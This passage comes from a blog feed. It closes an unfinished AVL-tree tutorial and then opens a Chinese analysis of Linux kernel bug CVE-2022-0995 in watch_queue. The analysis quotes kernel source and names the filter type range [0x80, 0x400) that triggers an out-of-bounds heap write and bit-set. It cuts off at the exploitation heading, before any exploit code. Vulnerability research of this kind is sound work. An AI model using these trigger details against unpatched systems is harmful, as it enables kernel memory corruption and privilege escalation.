Tree）是一种<strong>自平衡二叉查找树</strong>，其会在插入与删除节点的过程中保持自身的一种平衡，由于这个性质，其也被称为 <em>高度平衡树</em> ，其性质为：</p><ul><li><strong>AVL 树任一节点对应的两棵子树的最大高度差为 1</strong></li></ul><p>AVL 树最初是被发明来解决二叉查找树在经过多次操作后出现的不平衡的情况，例如下图这种情况，虽然其仍是一棵二叉查找树，但是由于其结构的不平衡，导致查找的效率大幅降低</p><p><img src="https://s2.loli.net/2022/05/28/eApM78arnTuOZb6.png" alt="image.png"></p><blockquote><p>比如说你要查找最左边的那一部分节点，这个时候二叉搜索树就退化成一个数组了，时间复杂度直接增长到 <code>O(N)</code>，这显然不是我们想要看到的</p></blockquote><p>AVL 树 <strong>通过在增加与删除元素时进行一次或多次旋转操作来实现树的重新平衡</strong>，其查找、插入、删除操作在平均与最坏情况下的时间复杂度都是 <code>O(logN)</code></p><h2 id="Pre-AVL-树节点定义"><a href="#Pre-AVL-树节点定义" class="headerlink" title="Pre. AVL 树节点定义"></a>Pre. AVL 树节点定义</h2><p>这里我们为节点引入一个新的成员——<code>高度</code>：<strong>由根节点到其左右子树的【最大】深度</strong></p><p>高度是我们对树进行重构使其重新成为 AVL 树的依据，我们在每个节点中记录下该节点的高度，并在每次操作时进行动态更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ALVTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span>key;</span><br><span class="line">    <span class="type">size_t</span>height;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ALVTreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ALVTreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应地，我们应当有一个用以计算一棵树的高度的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="旋转操作"><a href="#旋转操作" class="headerlink" title="旋转操作"></a>旋转操作</h2><p>这里我们引入一个新的操作——<strong>旋转</strong>（rotation），这是组成我们接下来的插入&#x2F;删除操作中的一个<strong>子操作</strong>，我们通过单次&#x2F;多次旋转操作来保持 AVL 树的高度平衡的特性</p><p>下图是一个最简单的旋转的例子，通过旋转使得一棵树重新成为 AVL 树</p><p><img src="https://s2.loli.net/2022/05/29/4aCjEhDTUkHZibs.gif" alt="260px-AVL_Tree_Example.gif"></p><h3 id="左旋"><a href="#左旋" class="headerlink" title="左旋"></a>左旋</h3><h3 id="右旋"><a href="#右旋" class="headerlink" title="右旋"></a>右旋</h3><h2 id="插入节点-1"><a href="#插入节点-1" class="headerlink" title="插入节点"></a>插入节点</h2><h2 id="删除节点-1"><a href="#删除节点-1" class="headerlink" title="删除节点"></a>删除节点</h2><h1 id="0x03-2-3-4树"><a href="#0x03-2-3-4树" class="headerlink" title="0x03. 2-3-4树"></a>0x03. 2-3-4树</h1><h1 id="0x04-红黑树"><a href="#0x04-红黑树" class="headerlink" title="0x04. 红黑树"></a>0x04. 红黑树</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了&lt;/p&gt;</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x08】CVE-2022-0995 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>我在看着你👁_👁</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2022-0995 是近日爆出来的一个存在于 _观察队列事件通知子系统_（watch_queue event notification subsystem）中的一个堆溢出漏洞，该漏洞自内核版本 <code>5.8</code> 中伴随着 watch queue subsystem 引入，在 <code>5.17-rc7</code> 版本中被修复</p><p>不过虽然获得了 <code>7.1</code> 的 CVSS 评分，但这个漏洞似乎并没有什么热度，不过在笔者看来这仍然是一个品相不错的漏洞</p><p>在开始之前我们先来补充一些基础知识</p><h2 id="General-notification-mechanism"><a href="#General-notification-mechanism" class="headerlink" title="General notification mechanism"></a><em>General notification mechanism</em></h2><blockquote><p>参见<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>通用通知机制</em> 是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 <code>CONFIG_WATCH_QUEUE</code> 编译选项启用（默认开启）</p><p>该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（<code>pipe_buffer</code> 队列），通过 <code>read()</code> 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）</p><p>管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道</p><p>若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 <code>pipe_buffer</code> ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，<code>read()</code> 将在读取当前缓冲区的最后一条消息后将 <code>WATCH_META_LOSS_NOTIFICATION</code> 插入输出缓冲区</p><h3 id="Watch-Queue（Notification-Output）API"><a href="#Watch-Queue（Notification-Output）API" class="headerlink" title="Watch Queue（Notification Output）API"></a>Watch Queue（Notification Output）API</h3><p>一个 <em>观测队列</em> （watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>该函数用以丢弃从 <code>get_watch_queue()</code> 获得的引用</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>当一个观测队列被创建后，我们可以应用一组 <em>过滤器</em> （filters）以限制接收的事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span> =</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;;</span><br><span class="line">ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</span><br></pre></td></tr></table></figure><p>其中 filter 应为一个 <code>struct watch_notification_filter</code> 类型变量，其中 <code>nr_filters</code> 表示 <code>filters[]</code> 数组中过滤器的数量，而 <code>__reserved</code> 应为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> &#123;</span></span><br><span class="line">        __u32   nr_filters;</span><br><span class="line">        __u32   __reserved;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <code>filters[]</code> 为一个 <code>watch_notification_type_filter</code> 类型的结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> &#123;</span></span><br><span class="line">        __u32   type;</span><br><span class="line">        __u32   info_filter;</span><br><span class="line">        __u32   info_mask;</span><br><span class="line">        __u32   subtype_filter[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><code>type</code> 为要过滤的事件类型，应当为类似 <code>WATCH_TYPE_KEY_NOTIFY</code> 的值</p></li><li><p><code>info_filter</code> 与 <code>info_mask</code> 充当通知记录的信息字段的过滤器，仅在以下情况才将通知写入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(watch.info &amp; info_mask) == info_filter</span><br></pre></td></tr></table></figure><p>例如，这可以用于忽略不在一个挂载树上的观测点的事件</p></li><li><p><code>subtype_filter</code> 为一个指示我们感兴趣的子类型的 bitmask，<code>subtype_filter[0]</code> 的 0 位对应子类型 0，1 位对应子类型 1，以此类推</p></li></ul><p>若 ioctl() 的参数为 NULL，则过滤器将被移除，我们将接收到所有来自观测源的事件</p><h2 id="内核中-watch-queue-subsystem-中-Event-Filter-的实现"><a href="#内核中-watch-queue-subsystem-中-Event-Filter-的实现" class="headerlink" title="内核中 watch queue subsystem 中 Event Filter 的实现"></a>内核中 watch queue subsystem 中 Event Filter 的实现</h2><p>前面我们抄了一大段的 kernel document，现在我们来深入源码看一下 watch queue subsystem 的实现机制</p><p>当我们调用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 时，会调用 <code>do_vfs_ioctl()</code> 判断 cmd 进行处理，而我们的 <code>IOC_WATCH_QUEUE_SET_FILTER</code> 不在其列表中，所以最后会走到 <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(ioctl, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">int</span>, cmd, <span class="type">unsigned</span> <span class="type">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = do_vfs_ioctl(f.file, fd, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = vfs_ioctl(f.file, cmd, arg);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>vfs_ioctl()</code> 中会调用 file 结构体自身的函数表中的 <code>unlocked_ioctl</code> 指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_ioctl);</span><br></pre></td></tr></table></figure><p>那么这里我们需要将目光放回管道的创建流程中分配文件描述符的部分，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">    __do_pipe_flags()</span><br><span class="line">    create_pipe_files()</span><br><span class="line">    alloc_file_pseudo()</span><br><span class="line">    alloc_file()</span><br></pre></td></tr></table></figure><p><code>alloc_file()</code> 分配一个 file 结构体并将其函数表设为上层调用传入的函数表，而在 <code>create_pipe_files()</code> 中传入的函数表为 <code>pipefifo_fops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因此最终调用到的是 <code>pipe_ioctl()</code>，对于 cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> 而言，最终会调用 <code>watch_queue_set_filter()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">int</span> count, head, tail, mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tail != head) &#123;</span><br><span class="line">count += pipe-&gt;bufs[tail &amp; mask].len;</span><br><span class="line">tail++;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="type">int</span> __user *)arg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">ret = watch_queue_set_size(pipe, arg);</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:</span><br><span class="line"><span class="keyword">return</span> watch_queue_set_filter(</span><br><span class="line">pipe, (<span class="keyword">struct</span> watch_notification_filter __user *)arg);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOIOCTLCMD;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>漏洞便发生在 <code>watch_queue_set_filter()</code>中将 filter 数组从用户空间拷贝到内核空间的过程当中，现在让我们仔细审视这个函数的执行流程，在一开始时首先会将用户空间的 <code>watch_notification_filter</code> 结构拷贝到内核空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">watch_queue_set_filter</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> watch_notification_filter __user *_filter)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> *<span class="title">tf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">wqueue</span> =</span> pipe-&gt;watch_queue;</span><br><span class="line"><span class="type">int</span> ret, nr_filter = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wqueue)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!_filter) &#123;</span><br><span class="line"><span class="comment">/* Remove the old filter */</span></span><br><span class="line">wfilter = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Grab the user&#x27;s filter specification */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>之后 <code>memdup_user()</code> 分配一块临时空间，将用户空间的 filter 数组拷贝至该临时空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br></pre></td></tr></table></figure><p>接下来会遍历每一个 <code>watch_notification_type_filter</code> 结构，记录 type 在指定范围的 filter 的数量到变量 <code>nr_filter</code> 中，这里其判断一个 type 是否合法的范围是 <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||</span><br><span class="line">    tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line"><span class="comment">/* Ignore any unknown types */</span></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">nr_filter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来会分配真正储存 filter 的的空间，这里用了一个 <code>struct_size()</code> 导出的大小为 <code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>（感兴趣的同学可以自行阅读源码），注意到这里计算大小用的是我们前面遍历计算得到的 <code>nr_filter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!wfilter)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line">wfilter-&gt;nr_filters = nr_filter;</span><br></pre></td></tr></table></figure><p>之后是将 filter 数组拷贝到分配的空间上，<strong>我们的第一个漏洞便出现在这里，其判断 type 是否合法使用的是</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ，<strong>与前面 nr_filter 的计算存在不一致性</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">q = wfilter-&gt;filters;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">q-&gt;type= tf[i].type;</span><br><span class="line">q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">__set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">q++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <code>BITS_PER_LONG</code> 定义于 <code>/include/asm-generic/bitsperlong.h</code> 中，<strong>在 32 位下为 32，64 位下为64</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITS_PER_LONG 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITS_PER_LONG 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_64BIT */</span></span></span><br></pre></td></tr></table></figure><p>那么前后对 type 范围的计算便存在不一致，我们不难想到的是<strong>我们可以指定几个 filter 的 type 为（计算 nr_filter 时的合法 type 上限值，拷贝 filter 时的合法 type 上限值）这个范围内的特定值，这样就能越界拷贝一定数量的 filter，从而完成堆上的越界写</strong></p><p>那么这里我们容易计算得出触发第一个漏洞的 type 的范围应为 <code>[0x80, 0x400)</code></p><p>而<strong>第二个漏洞则存在于上面这段代码中对</strong> <code>__set_bit()</code> <strong>的调用，该函数定义如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __set_bit(<span class="type">int</span> nr, <span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">long</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mask = BIT_MASK(nr);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p = ((<span class="type">unsigned</span> <span class="type">long</span> *)addr) + BIT_WORD(nr);</span><br><span class="line"></span><br><span class="line">*p  |= mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其作用便是<strong>将 addr 偏移 BIT_WORD(nr) 处的 BIT_MASK(mask) 位进行置 1 操作</strong>，这里的 <code>BIT_WORD()</code> 宏主要是除以 long 类型所占位数（64），而 <code>BIT_MASK()</code> 宏则是对 long 类型所占位数求模后结果作为 unsigned long 值 1 左移的位数导出结果数值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span></span><br></pre></td></tr></table></figure><p>而传入的第一个参数刚好为 type，由于我们的 type 可以在 <code>[0x80, 0x400)</code> 范围内取，<strong>而分配的 filter 空间却未必有那么大，因此这里存在一个越界置 1 位的漏洞，我们可以通过设置一个较大的 type 完成堆上越界置 1 位的操作</strong></p><p>例如对于 <code>kmalloc-96</code> 而言，我们的对象可以覆盖到下图所示范围（本图来自于 <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_o师傅的博客</a>）：</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>在<a 